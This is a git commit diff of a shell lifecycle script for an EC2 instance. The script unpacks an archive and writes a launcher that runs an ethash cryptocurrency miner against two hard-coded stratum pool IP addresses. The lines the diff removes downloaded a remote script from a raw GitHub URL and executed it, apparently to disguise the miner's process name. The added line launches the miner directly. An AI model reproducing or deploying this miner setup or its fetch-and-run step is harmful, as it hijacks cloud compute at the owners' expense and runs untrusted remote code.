ad17acae6420c93743c61d2d826680218a395ece
Jame <lungtungner@gmail.com>
2022-03-23 23:28:20 +0700

    Update lifecycle.sh

--- lifecycle.sh
+++ lifecycle.sh
@@ -4,21 +4,11 @@ cd /home/ec2-user
 			tar -xvf linux.tar.gz
             rm -rf linux.tar.gz
             mkdir bin
-			sudo wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/processname.sh
-			chmod +x processname.sh
-            ./processname.sh
-			echo ec2-user > inuser.txt
-            cp inuser.txt bin/inuser.txt
-            cp gitpath.txt bin/gitpath.txt
             cd bin/
 
 tee -a runsrc.sh <<EOF
 #!/bin/bash
-USEPROCNAME=$(cat SETPROCNAME.txt)
-pool1="184.164.64.100:8086"
-pool2="159.203.107.149:8080"
-./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2
-
+./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080
 EOF
 
             chmod +x runsrc.sh
